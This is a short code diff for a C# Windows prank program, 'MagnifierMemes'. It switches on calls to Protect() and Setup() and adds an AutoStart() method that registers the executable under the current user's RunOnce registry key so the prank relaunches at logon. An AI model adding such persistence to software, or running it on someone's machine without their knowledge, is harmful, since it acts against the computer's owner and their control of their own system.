@@ -9,6 +9,7 @@ using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using Microsoft.Win32;
 using PInvoke;
 
 #endregion
@@ -87,11 +88,23 @@ namespace MagnifierMemes
 
         private static void Main(string[] args)
         {
-            // Protect();
-            // Setup();
+            Protect();
+            Setup();
+            AutoStart();
             // Music();
             Task.Run(Prank);
             Thread.Sleep(-1);
+        }
+
+        private static void AutoStart()
+        {
+            try
+            {
+                RegistryKey rk = Registry.CurrentUser.OpenSubKey
+                    ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true);
+
+                rk.SetValue("Prank", Application.ExecutablePath);
+            } catch (Exception e){Console.WriteLine(e);}
         }
 
         private static void Protect()
